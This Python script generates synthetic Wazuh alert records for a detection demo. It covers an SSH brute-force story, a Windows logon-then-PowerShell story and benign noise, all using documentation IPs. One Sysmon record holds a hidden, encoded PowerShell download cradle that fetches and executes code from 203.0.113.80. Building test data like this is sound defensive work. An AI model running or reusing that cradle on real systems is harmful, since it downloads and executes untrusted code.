"""Write data/samples/wazuh_alerts.jsonl: synthetic alerts in Wazuh's alerts.json format.

Two attack stories and some benign noise, RFC 5737 documentation IPs only:
- web-01 (Linux): SSH password guessing against "deploy" from 198.51.100.23, Wazuh's own
  "multiple authentication failures" alert (level 10), then a successful login.
- WIN-FIN01 (Windows): failed logons for "alice" from 198.51.100.40, a success, encoded
  PowerShell with a download cradle (level 12), and a connection to 203.0.113.80:443 (on the
  demo IOC list).
- Benign: a normal logon on WIN-HR02, a file-integrity change on web-01.

    python scripts/make_wazuh_sample.py
"""

from __future__ import annotations

import json
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

OUT = Path(__file__).resolve().parent.parent / "data" / "samples" / "wazuh_alerts.jsonl"
START = datetime(2026, 9, 14, 8, 0, 0, tzinfo=UTC)
MANAGER = {"name": "wazuh-manager"}
WEB = {"id": "001", "name": "web-01", "ip": "10.10.0.21"}
FIN = {"id": "002", "name": "WIN-FIN01", "ip": "10.10.0.31"}
HR = {"id": "003", "name": "WIN-HR02", "ip": "10.10.0.32"}
SECURITY = "Microsoft-Windows-Security-Auditing"
SYSMON = "Microsoft-Windows-Sysmon"
POWERSHELL = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"


class Builder:
    def __init__(self) -> None:
        self.rows: list[dict[str, Any]] = []

    def add(
        self,
        seconds: int,
        agent: dict[str, str],
        rule: dict[str, Any],
        decoder: str,
        location: str,
        full_log: str | None = None,
        data: dict[str, Any] | None = None,
    ) -> None:
        when = START + timedelta(seconds=seconds)
        record: dict[str, Any] = {
            "timestamp": when.strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
            "rule": rule,
            "agent": agent,
            "manager": MANAGER,
            "id": f"{int(when.timestamp())}.{100001 + len(self.rows)}",
            "decoder": {"name": decoder},
            "location": location,
        }
        if full_log:
            record["full_log"] = full_log
        if data:
            record["data"] = data
        self.rows.append(record)

    def windows(
        self,
        seconds: int,
        agent: dict[str, str],
        rule: dict[str, Any],
        system: dict[str, str],
        eventdata: dict[str, str],
    ) -> None:
        computer = agent["name"] + ".corp.example"
        data = {"win": {"system": {"computer": computer, **system}, "eventdata": eventdata}}
        self.add(seconds, agent, rule, "windows_eventchannel", "EventChannel", data=data)


def build() -> list[dict[str, Any]]:
    b = Builder()
    ssh_failed = {
        "level": 5,
        "description": "sshd: authentication failed.",
        "id": "5760",
        "mitre": {"id": ["T1110.001"], "tactic": ["Credential Access"]},
        "groups": ["syslog", "sshd", "authentication_failed"],
    }
    for i in range(6):
        port = 50110 + i
        b.add(
            i * 20,
            WEB,
            ssh_failed,
            "sshd",
            "/var/log/auth.log",
            f"Sep 14 08:0{i * 20 // 60}:{i * 20 % 60:02d} web-01 sshd[2211]: Failed password "
            f"for deploy from 198.51.100.23 port {port} ssh2",
            {"srcip": "198.51.100.23", "srcport": str(port), "dstuser": "deploy"},
        )
    b.add(
        101,
        WEB,
        {
            "level": 10,
            "description": "sshd: Multiple authentication failures.",
            "id": "5720",
            "frequency": 6,
            "mitre": {"id": ["T1110"], "tactic": ["Credential Access"]},
            "groups": ["syslog", "sshd", "authentication_failures"],
        },
        "sshd",
        "/var/log/auth.log",
        data={"srcip": "198.51.100.23", "dstuser": "deploy"},
    )
    b.add(
        150,
        WEB,
        {
            "level": 3,
            "description": "sshd: authentication success.",
            "id": "5715",
            "mitre": {"id": ["T1078"], "tactic": ["Defense Evasion", "Initial Access"]},
            "groups": ["syslog", "sshd", "authentication_success"],
        },
        "sshd",
        "/var/log/auth.log",
        "Sep 14 08:02:30 web-01 sshd[2240]: Accepted password for deploy from 198.51.100.23 "
        "port 50199 ssh2",
        {"srcip": "198.51.100.23", "srcport": "50199", "dstuser": "deploy"},
    )
    win_failed = {
        "level": 5,
        "description": "Logon failure - Unknown user or bad password.",
        "id": "60122",
        "groups": ["windows", "windows_security", "win_authentication_failed"],
    }
    win_success = {
        "level": 3,
        "description": "Windows logon success.",
        "id": "60106",
        "groups": ["windows", "windows_security", "authentication_success"],
    }
    for i in range(4):
        b.windows(
            600 + i * 30,
            FIN,
            win_failed,
            {"eventID": "4625", "providerName": SECURITY},
            {
                "targetUserName": "alice",
                "ipAddress": "198.51.100.40",
                "logonType": "10",
                "subjectUserName": "-",
                "workstationName": "-",
            },
        )
    b.windows(
        740,
        FIN,
        win_success,
        {"eventID": "4624", "providerName": SECURITY},
        {"targetUserName": "alice", "ipAddress": "198.51.100.40", "logonType": "10"},
    )
    b.windows(
        800,
        FIN,
        {
            "level": 12,
            "description": "Powershell process spawned with an encoded command.",
            "id": "92057",
            "mitre": {"id": ["T1059.001"], "tactic": ["Execution"]},
            "groups": ["sysmon", "sysmon_event1", "windows"],
        },
        {"eventID": "1", "providerName": SYSMON},
        {
            "image": POWERSHELL,
            "commandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA ; "
            "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.80/a')",
            "parentImage": "C:\\Windows\\explorer.exe",
            "user": "CORP\\alice",
        },
    )
    b.windows(
        806,
        FIN,
        {
            "level": 3,
            "description": "Sysmon - Network connection.",
            "id": "92101",
            "groups": ["sysmon", "sysmon_event3", "windows"],
        },
        {"eventID": "3", "providerName": SYSMON},
        {
            "image": POWERSHELL,
            "sourceIp": "10.10.0.31",
            "destinationIp": "203.0.113.80",
            "destinationPort": "443",
            "user": "CORP\\alice",
        },
    )
    b.windows(
        900,
        HR,
        win_success,
        {"eventID": "4624", "providerName": SECURITY},
        {"targetUserName": "bob", "ipAddress": "10.10.0.50", "logonType": "2"},
    )
    b.add(
        960,
        WEB,
        {
            "level": 7,
            "description": "Integrity checksum changed.",
            "id": "550",
            "groups": ["ossec", "syscheck", "syscheck_entry_modified", "syscheck_file"],
        },
        "syscheck_integrity_changed",
        "syscheck",
        "File '/etc/nginx/nginx.conf' modified",
    )
    return sorted(b.rows, key=lambda r: r["timestamp"])


def main() -> None:
    rows = build()
    OUT.parent.mkdir(parents=True, exist_ok=True)
    OUT.write_text("".join(json.dumps(r, sort_keys=True) + "\n" for r in rows), encoding="utf-8")
    print(f"wrote {len(rows)} alerts to {OUT}")


if __name__ == "__main__":
    main()
